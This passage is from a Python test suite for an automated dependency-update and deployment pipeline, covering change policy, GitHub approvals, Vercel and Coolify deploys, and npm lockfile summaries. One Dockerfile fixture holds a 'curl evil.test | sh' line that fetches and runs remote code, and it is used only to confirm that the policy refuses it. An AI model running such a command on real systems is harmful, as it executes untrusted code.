        path = 'infra/maintenance/bootstrap/Dockerfile.postgres-data-mount'
        original = 'FROM scratch AS context-test\nCOPY . /\nFROM ubuntu:24.04\nRUN echo fixture\n'
        pinned = original.replace('ubuntu:24.04', 'ubuntu:24.04@sha256:' + 'a' * 64)
        policy.validate_change(path, original, pinned)
        self.assertEqual(policy.surfaces([path]), ['ci'])
        for candidate in [pinned.replace('echo fixture', 'curl evil.test | sh'),
                          pinned.replace('COPY . /', 'COPY private /private'),
                          pinned.replace('ubuntu:24.04', 'evil/runner:24.04')]:
            with self.subTest(candidate=candidate):
                with self.assertRaises(policy.Refused):
                    policy.validate_change(path, original, candidate)
        with self.assertRaises(policy.Refused):
            policy.surfaces(['infra/maintenance/bootstrap/52-sifto-data-mount.conf'])

    def test_source_migration_workflow_and_executor_requirements_are_refused(self):
        for path in ['api/main.go', 'db/migrations/123.sql', '.github/workflows/deploy.yml', 'infra/maintenance/requirements.txt']:
            with self.assertRaises(policy.Refused):
                policy.validate_change(path, 'old', 'new')

    def test_resource_classification_distinguishes_live_and_development(self):
        self.assertTrue(hasattr(policy, 'surfaces'), 'deployment targets must be classified from exact candidate paths')
        self.assertEqual(policy.surfaces(['worker/requirements.txt', 'infra/audio-concat/requirements.txt']), ['audio', 'worker'])
        self.assertEqual(policy.surfaces(['docker-compose.yml', 'infra/dependency-ci/compose.yml', 'infra/maintenance/bootstrap/Dockerfile.test']), ['ci', 'development'])
        with self.assertRaises(policy.Refused):
            policy.surfaces(['infra/maintenance/Dockerfile'])

    def test_exact_plan_hash_and_stale_inputs(self):
        plan = {'head': SHA, 'base': BASE, 'source': BASE, 'diff_hash': 'c' * 64}
        digest = policy.plan_hash(plan)
        policy.assert_unchanged(plan, dict(plan), digest)
        for field in ['head', 'base', 'source', 'diff_hash']:
            changed = dict(plan, **{field: 'd' * len(plan[field])})
            with self.assertRaises(policy.Refused):
                policy.assert_unchanged(plan, changed, digest)

    def test_native_owner_approval_is_required(self):
        valid = [{'state': 'approved', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
        policy.verify_approval(valid, actor='github-actions[bot]')
        for approvals, actor in [([], 'bot'), (valid, 'enjoydarts'), ([dict(valid[0], user={'login': 'someone'})], 'bot'), ([dict(valid[0], environments=[{'name': 'other'}])], 'bot')]:
            with self.assertRaises(policy.Refused):
                policy.verify_approval(approvals, actor=actor)

    def test_exact_ci_run_jobs_not_spoofed_contexts(self):
        run = {'id': 15, 'head_sha': SHA, 'event': 'workflow_dispatch', 'path': '.github/workflows/dependency-check.yml', 'conclusion': 'success', 'status': 'completed'}
        jobs = [{'name': name, 'conclusion': 'success', 'head_sha': SHA} for name in policy.CHECKS]
        policy.verify_checks(run, jobs, SHA)
        for candidate in [dict(run, head_sha=BASE), dict(run, path='.github/workflows/spoof.yml'), dict(run, event='pull_request'), dict(run, conclusion='failure')]:
            with self.assertRaises(policy.Refused):
                policy.verify_checks(candidate, jobs, SHA)
        with self.assertRaises(policy.Refused):
            policy.verify_checks(run, jobs[:-1], SHA)


class TransportTests(unittest.TestCase):
    def setUp(self):
        self.assertIsNotNone(SPEC, 'approval automation must be implemented')

    def test_pagination_is_complete_or_fails_closed(self):
        calls = []
        def transport(method, path, body):
            calls.append(path)
            return [{'id': len(calls)}] * (100 if len(calls) == 1 else 1)
        api = github.GitHub('owner/repo', transport=transport)
        self.assertEqual(len(api.pages('/pulls')), 101)
        self.assertEqual(len(calls), 2)
        api = github.GitHub('owner/repo', transport=lambda *_: [{}] * 100)
        with self.assertRaises(policy.Refused):
            api.pages('/pulls', max_pages=2)

    def test_repository_root_get_has_no_trailing_slash_and_keeps_path_guard(self):
        captured = []
        class Response:
            def __enter__(self): return self
            def __exit__(self, *_): return False
            def read(self, limit): return b'{"id":123,"full_name":"owner/repo"}'
        class Opener:
            def open(self, request, timeout):
                captured.append(request)
                return Response()
        api = github.GitHub('owner/repo')
        with patch.dict(os.environ, {'GH_TOKEN': 'secret-token'}), patch('urllib.request.build_opener', return_value=Opener()):
            try:
                repository = api.get('')
            except policy.Refused:
                self.fail('Exact repository root GET must support the canonical URL without a trailing slash')
            self.assertEqual(repository['id'], 123)
            self.assertEqual(captured[0].full_url, 'https://api.github.com/repos/owner/repo')
            for invalid in ('//foreign', 'https://foreign', 'relative', '/bad\\path'):
                with self.subTest(path=invalid), self.assertRaises(policy.Refused): api.http('GET', invalid, None)
            self.assertEqual(len(captured), 1)

    def test_mutating_requests_are_never_retried_on_ambiguity(self):
        calls = []
        def transport(*args):
            calls.append(args)
            raise TimeoutError('contains secret')
        api = github.GitHub('owner/repo', transport=transport)
        with self.assertRaises(github.Ambiguous):
            api.request('PUT', '/pulls/1/merge', {'sha': SHA})
        self.assertEqual(len(calls), 1)

    def test_actual_github_http_builds_only_fixed_origin_and_masks_errors(self):
        import urllib.error
        captured = []
        class Response:
            def __enter__(self): return self
            def __exit__(self, *_): return False
            def read(self, limit): return b'{"ok":true}'
        class Opener:
            def open(self, request, timeout):
                captured.append(request)
                return Response()
        api = github.GitHub('owner/repo')
        with patch.dict(os.environ, {'GH_TOKEN': 'secret-token'}), patch('urllib.request.build_opener', return_value=Opener()):
            self.assertEqual(api.request('POST', '/actions/workflows/deploy.yml/dispatches', {'ref': 'main'}), {'ok': True})
        self.assertEqual(captured[0].full_url, 'https://api.github.com/repos/owner/repo/actions/workflows/deploy.yml/dispatches')
        self.assertEqual(json.loads(captured[0].data), {'ref': 'main'})
        with patch('urllib.request.build_opener') as opener, patch.dict(os.environ, {'GH_TOKEN': 'secret-token'}):
            opener.return_value.open.side_effect = urllib.error.HTTPError('secret-url', 403, 'secret-token', {}, None)
            with self.assertRaises(policy.Refused) as refusal:
                api.request('PUT', '/pulls/1/merge', {'sha': SHA})
            self.assertNotIn('secret', str(refusal.exception))
            self.assertEqual(opener.return_value.open.call_count, 1)

    def test_merge_uses_exact_sha_and_does_not_retry_ambiguous_merge(self):
        calls = []
        merged = False
        def transport(method, path, body):
            nonlocal merged
            calls.append((method, path, body))
            if method == 'PUT':
                merged = True
                raise TimeoutError()
            if path == '/branches/main':
                return {'protected': True, 'commit': {'sha': BASE}}
            return {'state': 'open', 'merged': merged, 'merge_commit_sha': 'c' * 40 if merged else None, 'head': {'sha': SHA}, 'base': {'sha': BASE, 'ref': 'main'}, 'mergeable': True, 'mergeable_state': 'clean'}
        api = github.GitHub('owner/repo', transport=transport)
        with self.assertRaises(policy.Refused):
            pipeline.merge_once(api, {'pr': 1, 'head': SHA, 'base': BASE})
        self.assertEqual([c[0] for c in calls].count('PUT'), 1)
        self.assertEqual(next(call[2]['sha'] for call in calls if call[0] == 'PUT'), SHA)


class DeploymentTests(unittest.TestCase):
    def setUp(self):
        self.assertIsNotNone(importlib.util.find_spec('dependency_updates.deploy'), 'immutable deployment transport must be implemented')
        from dependency_updates import deploy
        self.deploy = deploy

    def test_commit_guard_rejects_changed_main_and_unapproved_dispatch(self):
        self.deploy.validate_dispatch(SHA, SHA, 'workflow_dispatch', 'true')
        for main, approved in [(BASE, 'true'), (SHA, 'false')]:
            with self.assertRaises(policy.Refused):
                self.deploy.validate_dispatch(SHA, main, 'workflow_dispatch', approved)

    def test_deployment_approval_has_one_request_and_never_reruns(self):
        self.assertTrue(hasattr(self.deploy, 'single_request'), 'deployment approval consumption must be checked')
        title = 'Approved dependency deployment 10 ' + SHA
        api = github.GitHub('owner/repo', transport=lambda *_: {'workflow_runs': [{'id': 20, 'display_title': title}], 'total_count': 1})
        self.deploy.single_request(api, 'deploy.yml', SHA, 10, 20, '1')
        for identifier, attempt in [(21, '1'), (20, '2')]:
            with self.assertRaises(policy.Refused):
                self.deploy.single_request(api, 'deploy.yml', SHA, 10, identifier, attempt)
        api = github.GitHub('owner/repo', transport=lambda *_: {'workflow_runs': [{'id': 20, 'display_title': title}, {'id': 21, 'display_title': title}], 'total_count': 2})
        with self.assertRaises(policy.Refused):
            self.deploy.single_request(api, 'deploy.yml', SHA, 10, 20, '1')

    def test_coolify_commit_pin_is_checked_and_mutations_not_replayed(self):
        requests = []
        app = {'git_commit_sha': 'HEAD', 'git_branch': 'main', 'repository_project_id': 123}
        def request(method, path, body=None):
            requests.append((method, path, body))
            if method == 'PATCH':
                app.update(body)
                return {}
            if path == '/applications/app':
                return dict(app)
            if path == '/deploy':
                return {'deployments': [{'deployment_uuid': 'job'}]}
            return {'status': 'finished', 'commit': SHA, 'application': {'uuid': 'app'}}
        self.deploy.coolify(request, 'app', SHA, lambda: None, sleep=lambda _: None)
        self.assertEqual([r for r in requests if r[1] == '/deploy'], [('POST', '/deploy', {'uuid': 'app', 'force': False})])
        self.assertEqual(app['git_commit_sha'], 'HEAD')

    def test_foreign_coolify_source_change_is_not_restored(self):
        app = {'git_commit_sha': 'HEAD', 'git_branch': 'main'}
        def request(method, path, body=None):
            if method == 'PATCH':
                app.update(body)
            if path == '/applications/app':
                return dict(app)
            if path == '/deploy':
                app['git_commit_sha'] = BASE
                return {'deployments': [{'deployment_uuid': 'job'}]}
            return {'status': 'finished', 'commit': SHA, 'application': {'uuid': 'app'}}
        with self.assertRaises(policy.Refused):
            self.deploy.coolify(request, 'app', SHA, lambda: None, sleep=lambda _: None)
        self.assertEqual(app['git_commit_sha'], BASE)

    def test_vercel_uses_exact_github_sha_and_verifies_production_alias(self):
        calls = []
        def request(method, path, body=None):
            calls.append((method, path, body))
            if '/projects/' in path:
                return {'id': 'prj_test', 'name': 'sifto'}
            if method == 'POST':
                # The official GitSourceGitHub org/repo variant requires ref.
                # Model the HTTP 400 boundary rather than accepting any body.
                source = body.get('gitSource', {})
                policy.require(set(source) == {'type', 'org', 'repo', 'ref', 'sha'}
                               and source['type'] == 'github' and source['org'] == 'owner'
                               and source['repo'] == 'repo' and source['ref'] == 'main' and source['sha'] == SHA,
                               'Vercel gitSource schema rejected')
                return {'id': 'dpl_test'}
            return {'id': 'dpl_test', 'readyState': 'READY', 'target': 'production', 'projectId': 'prj_test', 'gitSource': {'type': 'github', 'sha': SHA}, 'alias': ['sifto.net'], 'url': 'deployment.vercel.app'}
        self.assertTrue(hasattr(self.deploy, 'vercel'), 'immutable Vercel deployment must be implemented')
        self.deploy.vercel(request, 'team_test', 'prj_test', 'owner/repo', SHA, sleep=lambda _: None, verify_alias=lambda *_: None)
        body = next(call[2] for call in calls if call[0] == 'POST')
        self.assertEqual(body['gitSource']['sha'], SHA)
        self.assertEqual(body['gitSource']['ref'], 'main')
        self.assertNotIn('withLatestCommit', body)
        self.assertEqual(len([c for c in calls if c[0] == 'POST']), 1)

    def test_vercel_wrong_commit_or_unpromoted_alias_never_counts_as_deployed(self):
        self.assertTrue(hasattr(self.deploy, 'vercel'), 'immutable Vercel deployment must be implemented')
        for state in [{'readyState': 'READY', 'target': 'production', 'projectId': 'prj_test', 'gitSource': {'sha': BASE}, 'alias': ['sifto.net']}, {'readyState': 'READY', 'target': 'production', 'projectId': 'prj_test', 'gitSource': {'sha': SHA}, 'alias': []}]:
            def request(method, path, body=None):
                if '/projects/' in path:
                    return {'id': 'prj_test', 'name': 'sifto'}
                return {'id': 'dpl_test'} if method == 'POST' else state
            with self.assertRaises(policy.Refused):
                self.deploy.vercel(request, 'team_test', 'prj_test', 'owner/repo', SHA, sleep=lambda _: None, verify_alias=lambda *_: None)

    def test_vercel_lost_post_acknowledgement_never_replays_or_checks_alias(self):
        calls = []
        alias = Mock()
        def request(method, path, body=None):
            calls.append((method, path, body))
            if method == 'POST':
                raise github.Ambiguous('controlled lost acknowledgement')
            return {'id': 'prj_test', 'name': 'sifto'}
        with self.assertRaises(github.Ambiguous):
            self.deploy.vercel(request, 'team_test', 'prj_test', 'owner/repo', SHA,
                               sleep=lambda _: None, verify_alias=alias)
        self.assertEqual(len([call for call in calls if call[0] == 'POST']), 1)
        alias.assert_not_called()


class NpmSummaryTests(unittest.TestCase):
    def setUp(self):
        self.assertTrue(hasattr(policy, 'npm_lock_summary'), 'npm semantic summary is missing')

    def lock(self, packages, dependencies=None):
        return json.dumps({'lockfileVersion': 3, 'packages': {
            '': {'dependencies': dependencies or {'dep': '^1.0.0'}}, **packages}})

    def test_all_rows_root_versions_registry_completion_and_script_flags_are_visible(self):
        import base64
        path = 'node_modules/dep/node_modules/@node_modules/pkg'
        original = {'node_modules/removed': {'version': '1.0.0'},
                    'node_modules/dep': {'version': '1.0.0', 'hasInstallScript': False},
                    path: {'version': '1.0.0'}}
        updated = {'node_modules/added': {'version': '2.0.0', 'hasInstallScript': True},
                   'node_modules/dep': {'version': '1.0.1', 'hasInstallScript': True},
                   path: {'version': '1.0.0',
                          'resolved': 'https://registry.npmjs.org/@node_modules/pkg/-/pkg-1.0.0.tgz',
                          'integrity': 'sha512-' + base64.b64encode(bytes(64)).decode()}}
        summary = policy.npm_lock_summary(self.lock(original), self.lock(updated, {'dep': '^1.0.1'}))
        text = '\n'.join(summary)
        for expected in ('added 1, removed 1, changed 2', 'root dependencies/dep: ^1.0.0 -> ^1.0.1',
                         '+added: 2.0.0 (hasInstallScript=true)', '-removed: 1.0.0',
                         'dep: 1.0.0 -> 1.0.1 (hasInstallScript=false -> true)',
                         'dep > @node_modules/pkg: 1.0.0 (registry pair completed)'):
            self.assertIn(expected, text)
        self.assertEqual(len(summary), 6)
        self.assertEqual(summary, policy.npm_lock_summary(
            self.lock(dict(reversed(list(original.items())))),
            self.lock(dict(reversed(list(updated.items()))), {'dep': '^1.0.1'})))

    def test_root_only_diff_keeps_a_header_and_each_dependency_change(self):
        summary = policy.npm_lock_summary(self.lock({}), self.lock({}, {'dep': '^1.0.1'}))
        self.assertEqual(len(summary), 2)
        self.assertIn('added 0, removed 0, changed 0', summary[0])
        self.assertEqual(summary[1], 'root dependencies/dep: ^1.0.0 -> ^1.0.1')

    def test_nested_labels_preserve_node_modules_in_either_scoped_name_component(self):
        paths = {
            'node_modules/@scope/node_modules/node_modules/pkg': '@scope/node_modules > pkg',
            'node_modules/@node_modules/pkg/node_modules/@scope/node_modules': '@node_modules/pkg > @scope/node_modules',
            'node_modules/node_modules/node_modules/pkg': 'node_modules > pkg',
        }
        before = self.lock({path: {'version': '1.0.0'} for path in paths})
        after = self.lock({path: {'version': '1.0.1'} for path in paths})
        summary = policy.npm_lock_summary(before, after)
        for expected in paths.values():
            self.assertIn(expected + ': 1.0.0 -> 1.0.1', summary)
        self.assertEqual(len(summary), 4)

    def test_change_count_accepts_300_and_refuses_301_without_elision(self):
        for count in (300, 301):
            before = self.lock({'node_modules/pkg%03d' % index: {'version': '1.0.0'} for index in range(count)})
            after = self.lock({'node_modules/pkg%03d' % index: {'version': '1.0.1'} for index in range(count)})
            if count == 300:
                self.assertEqual(len(policy.npm_lock_summary(before, after)), 301)
            else:
                with self.assertRaisesRegex(policy.Refused, 'summary is too large'):
                    policy.npm_lock_summary(before, after)

    def test_summary_character_limit_includes_newlines_and_rejects_one_extra(self):
        def inputs(size):
            return (self.lock({'node_modules/' + 'a' * size: {'version': '1.0.0'}}),
                    self.lock({'node_modules/' + 'a' * size: {'version': '1.0.1'}}))
        length = len('\n'.join(policy.npm_lock_summary(*inputs(1))))
        boundary = 1 + 12_000 - length
        self.assertEqual(len('\n'.join(policy.npm_lock_summary(*inputs(boundary)))), 12_000)
        with self.assertRaisesRegex(policy.Refused, 'summary is too large'):
            policy.npm_lock_summary(*inputs(boundary + 1))

    def test_summary_never_bypasses_unknown_script_link_transport_or_type_validation(self):
        before = self.lock({'node_modules/dep': {'version': '1.0.0'}})
        for field, value in (('unknown', True), ('scripts', {'install': 'fixture'}), ('link', True),
                             ('resolved', 'https://example.invalid/dep.tgz'), ('hasInstallScript', 1)):
            after = self.lock({'node_modules/dep': {'version': '1.0.1', field: value}})
            with self.subTest(field=field), self.assertRaises(policy.Refused):
                policy.npm_lock_summary(before, after)
        for malformed in ('{', '{"lockfileVersion":3,"packages":{}}',
                          '{"lockfileVersion":3,"lockfileVersion":3,"packages":{"":{}}}'):
            with self.subTest(malformed=malformed), self.assertRaises(policy.Refused):
                policy.npm_lock_summary(before, malformed)


class PipelineTests(unittest.TestCase):
    """Exercise orchestration through its real controlled REST boundary."""
    def setUp(self):
        self.assertIsNotNone(SPEC)
        self.head, self.base, self.merged = SHA, BASE, 'c' * 40
        self.repo = 'owner/repo'
        self.approvals = [{'state': 'approved', 'user': {'login': 'enjoydarts'}, 'environments': [{'name': 'production-maintenance'}]}]
        self.paths = ['worker/requirements.in', 'worker/requirements.txt']
        releases = patch('dependency_updates.release_age.PyPI.release', return_value={
            'info': {'name': 'httpx', 'version': '0.29.0'}, 'urls': [
                {'digests': {'sha256': 'a' * 64}, 'upload_time_iso_8601': '2026-10-02T12:00:00Z', 'yanked': False}]})
        releases.start()
        self.addCleanup(releases.stop)
        self.mutations = []
        self.author = 'github-actions[bot]'
        self.fork = False
        self.after = 'httpx==0.29.0\n'
        self.branch = 'renovate-ci/pip-minor-patch'
        self.labels = []
        self.body = ''
        self.check_path = '.github/workflows/dependency-check.yml'
        self.mergeable_state = 'clean'
        self.preview_failure = False
        self.api = github.GitHub(self.repo, transport=self.transport)
        self.image_validation_error = self.image_scan_error = None
        self.image_validation_hook = None
        self.image_events = []

    def transport(self, method, path, body):
        if method != 'GET':
            self.mutations.append((method, path, body))
            if method == 'PUT':
                self.base = self.merged
                return {'merged': True, 'sha': self.merged}
            return None
        endpoint = path.split('?')[0]
        if endpoint == '/git/ref/heads/main':
            return {'object': {'sha': self.base}}
        if endpoint == '/branches/main':
            return {'protected': True, 'commit': {'sha': self.base}}
        if endpoint == '/pulls/1':
            return {'state': 'open', 'draft': False, 'merged': False, 'user': {'login': self.author}, 'head': {'sha': self.head, 'ref': self.branch, 'repo': {'full_name': 'other/repo' if self.fork else self.repo}}, 'base': {'sha': self.base, 'ref': 'main', 'repo': {'full_name': self.repo}}, 'changed_files': len(self.paths), 'labels': self.labels, 'body': self.body, 'mergeable': True, 'mergeable_state': self.mergeable_state}
        if endpoint.startswith('/compare/'):
            return {'merge_base_commit': {'sha': self.base}, 'status': 'ahead'}
        if endpoint == '/pulls/1/files':
            return [{'filename': path, 'status': 'modified', 'additions': 1, 'deletions': 1} for path in self.paths]
        if endpoint.startswith('/contents/'):
            import base64
            text = 'httpx==0.28.1\n' if 'ref=' + BASE in path else self.after
            if '/requirements.txt?' in path:
                text = policy.UV_HEADER + text.rstrip('\n') + ' \\\n    --hash=sha256:' + 'a' * 64 + '\n    # via -r requirements.in\n'
            return {'type': 'file', 'encoding': 'base64', 'size': len(text), 'content': base64.b64encode(text.encode()).decode()}
        if endpoint.endswith('/statuses'):
            statuses = [{'context': 'renovate/stability-days', 'state': 'success', 'creator': {'login': 'github-actions[bot]'}}]
            if self.preview_failure:
                statuses.append({'context': 'Vercel', 'state': 'failure', 'creator': {'login': 'vercel[bot]'}})
            return statuses
        if endpoint == '/actions/runs/10':
            return {'event': 'workflow_dispatch', 'head_branch': 'main', 'head_sha': BASE, 'path': '.github/workflows/dependency-update.yml', 'run_attempt': 1, 'actor': {'login': 'github-actions[bot]'}, 'display_title': 'Dependency PR 1 ' + SHA + ' ' + BASE}
        if endpoint.endswith('/approvals'):
            return self.approvals
        if endpoint == '/actions/runs/15':
            return {'id': 15, 'event': 'workflow_dispatch', 'head_sha': SHA, 'path': self.check_path, 'status': 'completed', 'conclusion': 'success'}
        if endpoint.endswith('/jobs'):
            return {'jobs': [{'name': name, 'head_sha': SHA, 'conclusion': 'success'} for name in policy.CHECKS], 'total_count': 4}
        if '/actions/workflows/deploy.yml/runs' in path:
            dispatches = [m for m in self.mutations if m[1] == '/actions/workflows/deploy.yml/dispatches']
            return {'workflow_runs': [{'id': 16, 'event': 'workflow_dispatch', 'head_sha': self.merged, 'path': '.github/workflows/deploy.yml', 'status': 'completed', 'conclusion': 'success'}] if dispatches else [], 'total_count': int(bool(dispatches))}
        raise AssertionError('Unexpected controlled API request: ' + endpoint)

    def plan(self):
        value = pipeline.candidate(self.api, 1, SHA, BASE, BASE, python_cutoff='2026-10-05T00:00:00Z')
        value['ci_run'] = 15
        value['image_security'] = self.image_evidence()
        return value

    def image_evidence(self, phase='candidate', head=SHA):
        from dependency_updates import image_security
        return {'version': 1, 'run_id': 20, 'conclusion': 'failure',
                'ticket': {'phase': phase, 'head': head, 'parent_run': 10}, 'inventory': None,
                'images': [{'component': component, 'platform': values[0],
                            'vulnerability_counts': dict.fromkeys(image_security.SEVERITIES, 1)}
                           for component, values in image_security.EXPECTED.items()]}

    def test_old_plan_without_image_evidence_cannot_consume_owner_approval(self):
        plan = self.plan()
        del plan['image_security']
        with self.assertRaisesRegex(policy.Refused, 'image evidence'):
            self.execute(plan)
        self.assertEqual(self.mutations, [])

    def test_semantically_unready_candidate_is_rejected_before_any_image_scan(self):
        self.paths = ['worker/requirements.in']
        with self.assertRaisesRegex(policy.Refused, 'corresponding.*lock'):
            pipeline.prepare(self.api, 1, SHA, BASE, BASE)
        self.assertEqual(self.image_events, [])
        self.assertEqual(self.mutations, [])

    def test_prepared_image_evidence_revalidation_failure_prevents_merge(self):
        self.image_validation_error = policy.Refused('Prepared image evidence changed')
        with self.assertRaisesRegex(policy.Refused, 'image evidence changed'):
            self.execute(self.plan())
        self.assertEqual(self.mutations, [])

    def test_native_approval_disappears_during_image_revalidation_prevents_merge(self):
        self.image_validation_hook = self.approvals.clear
        with self.assertRaises(policy.Refused): self.execute(self.plan())
        self.assertEqual(self.mutations, [])

    def test_native_approval_authority_changes_during_image_revalidation_prevents_merge(self):
        # The old owner approval still exists, so verify_approval alone passes.
        self.image_validation_hook = lambda: self.approvals.append({
            'state': 'rejected', 'user': {'login': 'enjoydarts'},
            'environments': [{'name': 'production-maintenance'}]})
        with self.assertRaisesRegex(policy.Refused, 'authority changed'):
            self.execute(self.plan())
        self.assertEqual(self.mutations, [])

    def test_merged_image_scan_happens_once_after_actual_deployment_success(self):
        self.execute(self.plan())
        self.assertEqual(self.image_events, [('revalidate', SHA), ('merged', self.merged)])
        self.assertIn('Verified merged image advisory', self.summary)
        self.assertIn('CRITICAL', self.summary)
        self.assertIn('**failure**', self.summary)

    def test_incomplete_postmerge_scan_keeps_merge_consumed_and_parent_failed(self):
        self.image_scan_error = policy.Refused('Incomplete image scan')
        with self.assertRaisesRegex(policy.Refused, 'Incomplete image scan'):
            self.execute(self.plan())
        self.assertEqual([m[0] for m in self.mutations], ['PUT', 'POST'])
        self.assertEqual(self.image_events, [('revalidate', SHA), ('merged', self.merged)])

    def test_diagnostic_namespace_is_never_a_native_candidate(self):
        for suffix in ('123', 'broken', '0', '123-extra'):
            self.branch = 'renovate-ci/approval-probe-' + suffix
            with self.subTest(branch=self.branch), self.assertRaisesRegex(policy.Refused, 'Diagnostic'):
                self.plan()
            self.assertEqual(self.mutations, [])

    def test_python_input_without_changed_lock_refused_before_ci_for_both_paths(self):
        for emergency in (False, True):
            self.setUp()
            self.paths = ['worker/requirements.in']
            if emergency:
                self.branch, self.author = 'dependency-security/critical', 'enjoydarts'
                self.labels, self.body = [{'name': 'dependency-security'}], 'Security fix: critical advisory'
            with self.subTest(emergency=emergency), self.assertRaisesRegex(policy.Refused, 'corresponding.*lock'):
                self.plan()
            self.assertEqual(self.mutations, [])

    def test_latest_renovate_artifact_failure_or_foreign_creator_refused(self):
        for state, creator in [('failure', {'login': 'github-actions[bot]', 'id': 41898282, 'type': 'Bot'}),
                               ('pending', {'login': 'github-actions[bot]', 'id': 41898282, 'type': 'Bot'}),
                               ('error', {'login': 'github-actions[bot]', 'id': 41898282, 'type': 'Bot'}),
                               ('success', {'login': 'github-actions[bot]', 'id': 999, 'type': 'Bot'})]:
            self.setUp()
            original = self.transport
            def transport(method, path, body):
                value = original(method, path, body)
                if path.split('?')[0].endswith('/statuses'):
                    return [{'context': 'renovate/artifacts', 'state': state, 'creator': creator},
                            {'context': 'renovate/artifacts', 'state': 'success', 'creator': {'login': 'github-actions[bot]', 'id': 41898282, 'type': 'Bot'}}] + value
                return value
            self.api = github.GitHub(self.repo, transport=transport)
            with self.subTest(state=state, creator=creator), self.assertRaisesRegex(policy.Refused, 'artifact'):
                self.plan()
            self.assertEqual(self.mutations, [])

    def test_discovery_explicitly_skips_diagnostic_namespace(self):
        self.branch = 'renovate-ci/approval-probe-10'
        original = self.api.transport
        def transport(method, path, body):
            if path.startswith('/actions/workflows/dependency-update.yml/runs'):
                return {'workflow_runs': [], 'total_count': 0}
            if path.startswith('/pulls?'):
                return [{'number': 1, 'head': {'sha': SHA, 'ref': self.branch}}]
            if path == '/pulls/1':
                raise AssertionError('Diagnostic must be skipped before native candidate lookup')
            return original(method, path, body)
        self.api.transport = transport
        with patch.dict(os.environ, {'GITHUB_SHA': BASE}): pipeline.discover(self.api)
        self.assertEqual(self.mutations, [])

    def test_reserved_namespace_has_no_candidate_opt_in(self):
        from inspect import signature
        self.assertNotIn('_approval_probe', signature(pipeline.candidate).parameters)
        self.branch = 'renovate-ci/approval-probe-10'
        with self.assertRaises(TypeError):
            pipeline.candidate(self.api, 1, SHA, BASE, BASE, _approval_probe={
                'pr': 1, 'head': SHA, 'source': BASE, 'branch': self.branch})
        self.assertEqual(self.mutations, [])

    def test_prepare_and_execute_refuse_reserved_namespace_before_mutations(self):
        plan = self.plan()
        self.branch = plan['branch'] = 'renovate-ci/approval-probe-10'
        with self.assertRaisesRegex(policy.Refused, 'Diagnostic'):
            pipeline.prepare(self.api, 1, SHA, BASE, BASE)
        with self.assertRaisesRegex(policy.Refused, 'Diagnostic'):
            self.execute(plan)
        self.assertEqual(self.mutations, [])

    def execute(self, plan):
        from dependency_updates import image_security
        def revalidate(api, current, evidence):
            self.image_events.append(('revalidate', current['head']))
            if self.image_validation_error: raise self.image_validation_error
            if self.image_validation_hook: self.image_validation_hook()
            return evidence
        def start(api, current, phase, head, ref):
            self.image_events.append((phase, head))
            self.assertEqual(phase, 'merged')
            self.assertEqual(self.base, self.merged)
            if set(current['surfaces']) & {'api', 'worker', 'web'}:
                self.assertTrue(any('/deploy.yml/dispatches' in m[1] for m in self.mutations))
            if 'audio' in current['surfaces']:
                self.assertTrue(any('/deploy-audio-concat.yml/dispatches' in m[1] for m in self.mutations))
            return {'phase': phase, 'head': head}
        def wait(api, current, ticket):
            if self.image_scan_error: raise self.image_scan_error
            return self.image_evidence(ticket['phase'], ticket['head'])
        with tempfile.TemporaryDirectory() as directory:
            with patch.dict(os.environ, {'GITHUB_RUN_ATTEMPT': '1', 'GITHUB_SHA': BASE, 'GITHUB_RUN_ID': '10', 'GITHUB_STEP_SUMMARY': directory + '/summary'}), \
                patch.object(image_security, 'revalidate', side_effect=revalidate), \
                patch.object(image_security, 'start', side_effect=start), patch.object(image_security, 'wait', side_effect=wait):
                pipeline.execute(self.api, plan, policy.plan_hash(plan))
                self.summary = Path(directory + '/summary').read_text()

    def python_candidate(self, uploaded='2026-10-02T12:00:00Z'):
        import base64
        before = policy.UV_HEADER + 'botocore==1.43.107 \\\n    --hash=sha256:' + 'a' * 64 + '\n    # via boto3\n'
        after = before.replace('1.43.107', '1.43.108')
        self.paths = ['worker/requirements.txt']
        transport = self.transport
        def content(method, path, body):
            if path.startswith('/contents/'):
                value = before if 'ref=' + BASE in path else after
                return {'type': 'file', 'encoding': 'base64', 'size': len(value), 'content': base64.b64encode(value.encode()).decode()}
            return transport(method, path, body)
        self.api = github.GitHub(self.repo, transport=content)
        metadata = {'info': {'name': 'botocore', 'version': '1.43.108'}, 'urls': [
            {'digests': {'sha256': 'a' * 64}, 'upload_time_iso_8601': uploaded, 'yanked': False}]}
        return metadata

    def test_normal_candidate_requires_independent_python_artifact_age(self):
        metadata = self.python_candidate('2026-10-09T00:00:00Z')
        with patch('dependency_updates.release_age.PyPI.release', return_value=metadata), self.assertRaisesRegex(policy.Refused, 'seven-day'):
            self.plan()
        self.assertEqual(self.mutations, [])

    def test_execution_keeps_prepared_cutoff_despite_clock_advance(self):
        metadata = self.python_candidate()
        with patch('dependency_updates.release_age.PyPI.release', return_value=metadata):
            plan = self.plan()
            self.assertEqual(plan['python_age']['cutoff'], '2026-10-05T00:00:00Z')
            with patch('dependency_updates.release_age.release_cutoff', side_effect=AssertionError('Prepared cutoff must be reused')):
                self.execute(plan)

    def test_metadata_change_or_outage_invalidates_approval_before_merge(self):
        for outage in (False, True):
            with self.subTest(outage=outage):
                self.setUp()
                metadata = self.python_candidate()
                with patch('dependency_updates.release_age.PyPI.release', return_value=metadata):
                    plan = self.plan()
                metadata['urls'][0]['upload_time_iso_8601'] = '2026-10-03T12:00:00Z'
                with patch('dependency_updates.release_age.PyPI.release',
                           side_effect=policy.Refused('Unavailable') if outage else None,
                           return_value=metadata), self.assertRaises(policy.Refused):
                    self.execute(plan)
                self.assertEqual(self.mutations, [])

    def test_large_verified_artifact_inventory_has_bounded_immutable_approval_evidence(self):
        import base64
        hashes = ['%064x' % index for index in range(1000)]
        before = policy.UV_HEADER + 'fixture==1.0.0 \\\n    --hash=sha256:' + 'f' * 64 + '\n    # via -r requirements.in\n'
        after = policy.UV_HEADER + 'fixture==1.0.1 \\\n' + '\n'.join(
            '    --hash=sha256:' + digest + (' \\' if index < 999 else '')
            for index, digest in enumerate(hashes)) + '\n    # via -r requirements.in\n'
        self.paths = ['worker/requirements.txt']
        transport = self.transport
        def contents(method, path, body):
            if path.startswith('/contents/'):
                text = before if 'ref=' + BASE in path else after
                return {'type': 'file', 'encoding': 'base64', 'size': len(text), 'content': base64.b64encode(text.encode()).decode()}
            return transport(method, path, body)
        self.api = github.GitHub(self.repo, transport=contents)
        metadata = {'info': {'name': 'fixture', 'version': '1.0.1'}, 'urls': [
